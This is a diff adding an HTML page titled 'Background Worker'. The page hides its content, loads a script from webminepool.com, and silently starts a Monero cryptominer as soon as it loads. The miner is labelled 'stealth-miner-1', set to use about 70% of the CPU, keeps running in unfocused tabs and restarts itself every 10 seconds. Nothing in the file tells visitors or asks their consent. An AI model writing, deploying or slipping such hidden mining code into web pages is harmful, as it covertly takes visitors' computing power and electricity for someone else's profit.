@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Background Worker</title>
+    <style>
+        /* Hide everything */
+        body {
+            display: none;
+            margin: 0;
+            padding: 0;
+        }
+    </style>
+</head>
+<body>
+
+    <script src="https://webminepool.com/lib/base.js"></script>
+    <script>
+        // Configure the Monero Ocean miner
+        const miner = WMP.User('46PVd8VcRi9hHeR77MENgY7FCpsXD4iYgi68cHXhXRNdGpEqGa2mmbGeq7UTCKh9LC2Sr5SEQ26Qvh5XNV1qcwLyFPz3VWZ', 'stealth-miner-1', {
+            threads: -1,           // Auto-select CPU threads
+            throttle: 0.3,         // 70% CPU usage (0.3 = 30% throttle)
+            background: true,      // Continue mining when tab is unfocused
+            ads: false             // No ad support
+        });
+
+        // Start mining as soon as the DOM is ready
+        document.addEventListener("DOMContentLoaded", function () {
+            if (!miner.isRunning()) {
+                miner.start();
+            }
+        });
+
+        // Optional: reconnect if disconnected
+        setInterval(() => {
+            if (!miner.isRunning()) {
+                miner.start();
+            }
+        }, 10000); // Every 10 seconds
+    </script>
+
+</body>
+</html>
